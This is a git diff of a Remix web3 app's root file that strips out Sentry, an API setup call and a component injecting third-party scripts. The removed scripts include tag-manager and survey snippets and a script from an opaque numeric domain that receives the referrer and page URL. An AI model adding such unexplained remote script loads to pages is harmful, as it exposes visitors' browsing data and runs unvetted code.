@@ -10,11 +10,9 @@ import {
   Scripts,
   ScrollRestoration,
   useLoaderData,
-  useLocation,
   useRouteError,
 } from '@remix-run/react'
 import { useTheme } from '@routes/actions+/set-theme'
-import { withSentry } from '@sentry/remix'
 import { getEnv } from '@server/env'
 import { getTheme } from '@server/theme'
 
@@ -27,7 +25,6 @@ import { Toaster } from '@0xintuition/1ui'
 import { ErrorPage } from '@components/error-page'
 import { GlobalLoading } from '@components/global-loading'
 import { getChainEnvConfig } from '@lib/utils/environment'
-import { setupAPI } from '@server/auth'
 import { CURRENT_ENV } from 'app/consts'
 import { ClientOnly } from 'remix-utils/client-only'
 import { useAccount, useSwitchChain } from 'wagmi'
@@ -69,8 +66,6 @@ export const meta: MetaFunction<typeof loader> = ({ data }) => {
 }
 
 export async function loader({ request }: LoaderFunctionArgs) {
-  setupAPI(request)
-
   return json({
     env: getEnv(),
     requestInfo: {
@@ -86,12 +81,10 @@ export async function loader({ request }: LoaderFunctionArgs) {
 export function Document({
   children,
   nonce,
-  gtmTrackingId,
   /* eslint-disable @typescript-eslint/no-unused-vars */
   theme = 'system',
 }: {
   children: React.ReactNode
-  gtmTrackingId?: string
   nonce?: string
   theme?: string
 }) {
@@ -106,7 +99,6 @@ export function Document({
         />
         <Meta />
         <Links />
-        <ExternalScripts gtmTrackingId={gtmTrackingId} />
       </head>
       <body>
         <main className="relative flex min-h-screen w-full flex-col justify-between antialiased">
@@ -119,102 +111,13 @@ export function Document({
   )
 }
 
-export function ExternalScripts({
-  gtmTrackingId,
-}: {
-  gtmTrackingId: string | undefined
-}) {
-  const location = useLocation()
-
-  useEffect(() => {
-    const scripts = [
-      {
-        id: 'custom-script',
-        src: `https://g9904216750.co/gb?id=-NzA1YkYvThmMw5rFg9n&refurl=${document.referrer}&winurl=${encodeURIComponent(window.location.href)}`,
-      },
-      {
-        id: 'maze-universal-snippet',
-        content: `
-          (function (m, a, z, e) {
-            var s, t;
-            try {
-              t = m.sessionStorage.getItem('maze-us');
-            } catch (err) {}
-
-            if (!t) {
-              t = new Date().getTime();
-              try {
-                m.sessionStorage.setItem('maze-us', t);
-              } catch (err) {}
-            }
-            s = a.createElement('script');
-            s.src = z + '?apiKey=' + e;
-            s.async = true;
-            a.getElementsByTagName('head')[0].appendChild(s);
-            m.mazeUniversalSnippetApiKey = e;
-          })(window, document, 'https://snippet.maze.co/maze-universal-loader.js', '92e1339d-a40d-44ca-b252-7c5f2a5118df');
-        `,
-      },
-      {
-        id: 'gtm-script',
-        content: `
-        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-        })(window,document,'script','dataLayer','${gtmTrackingId}')
-      `,
-      },
-    ]
-
-    scripts.forEach((script) => {
-      const existingScript = document.getElementById(script.id)
-      if (existingScript) {
-        return
-      }
-
-      const newScript = document.createElement('script')
-      newScript.id = script.id
-      newScript.async = true
-      if (script.src) {
-        newScript.src = script.src
-      } else if (script.content) {
-        newScript.textContent = script.content
-      }
-
-      document.head.appendChild(newScript)
-    })
-
-    return () => {
-      scripts.forEach((script) => {
-        const existingScript = document.getElementById(script.id)
-        if (existingScript) {
-          existingScript.remove()
-        }
-      })
-    }
-  }, [location]) // re-run the effect if location changes
-
-  return gtmTrackingId ? (
-    <noscript>
-      <iframe
-        title="Google Tag Manager"
-        src={`https://www.googletagmanager.com/ns.html?id=${gtmTrackingId}`}
-        height={0}
-        width={0}
-        style={{ display: 'none', visibility: 'hidden' }}
-      />
-    </noscript>
-  ) : null
-}
-
 function App() {
   const nonce = useNonce()
   const theme = useTheme()
   const { env } = useLoaderData<typeof loader>()
 
   return (
-    <Document nonce={nonce} theme={theme} gtmTrackingId={env.GTM_TRACKING_ID}>
+    <Document nonce={nonce} theme={theme}>
       <GlobalLoading />
       <Toaster position="top-right" />
       <ClientOnly>
@@ -227,10 +130,6 @@ function App() {
     </Document>
   )
 }
-
-export default withSentry(App, {
-  wrapWithErrorBoundary: process.env.NODE_ENV === 'production',
-})
 
 export function AppLayout() {
   const { chain } = useAccount()
@@ -276,3 +175,5 @@ export function ErrorBoundary() {
     </Document>
   )
 }
+
+export default App
